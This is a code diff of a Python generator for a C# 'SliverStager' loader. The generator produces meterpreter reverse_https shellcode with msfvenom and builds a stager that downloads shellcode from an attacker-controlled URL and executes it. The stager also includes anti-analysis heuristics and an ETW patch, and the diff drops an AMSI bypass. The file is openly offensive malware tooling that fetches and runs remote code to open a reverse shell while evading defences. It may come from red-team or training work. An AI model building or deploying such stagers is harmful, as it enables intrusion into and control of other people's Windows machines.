@@ -3,10 +3,10 @@ import ak
 import os
 import subprocess
 
-LHOST = "192.168.49.65"
-LPORT = 443
 BASE_FILENAME = 'win_msf_sliver_stager'
-MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
+FN_CS = BASE_FILENAME + ".cs"
+
+MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
 STAGER_URL = "http://192.168.49.65/sc"
 
 def get_shellcode(msfvenom_cmd):
@@ -14,7 +14,7 @@ def get_shellcode(msfvenom_cmd):
 
   return shellcode
 
-def generate(stager_url):
+def generate():
   url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)
 
   template = """
@@ -36,7 +36,6 @@ namespace SliverStager
         {{
             {ak.HEURISTICS_CODE}
             {ak.ETW_PATCH}
-            {ak.AMSI_BYPASS_CODE}
             {URL_DL_CODE}
             {ak.START_SHELLCODE}
         }}
@@ -46,31 +45,19 @@ namespace SliverStager
   """.format(URL_DL_CODE=url_dl_code,
              ak=ak)
 
-  print(template)
-  f = open(BASE_FILENAME + ".cs", "w")
-  f.write(template)
-  f.close()
+  ak.write_file(FN_CS, template)
 
-  print("Wrote " + BASE_FILENAME + ".cs")
-
-
-def compile():
-  cmd = f"mcs {BASE_FILENAME}.cs"
-  os.system(cmd)
 
 def generate_shellcode():
   shellcode = get_shellcode(MSFVENOM_CMD)
 
-  filename = BASE_FILENAME + '.sc'
-  f = open(filename, 'wb')
-  f.write(shellcode)
-  f.close()
-  print("Wrote shellcode to " + filename)
+  ak.write_file(FN_SHELLCODE, shellcode)
 
 def main():
-  #generate_shellcode()
-  generate(STAGER_URL)
-  compile()
+  # generate_shellcode()
+  generate()
+
+  ak.cs_compile(FN_CS)
 
 if __name__ == "__main__":
   main()
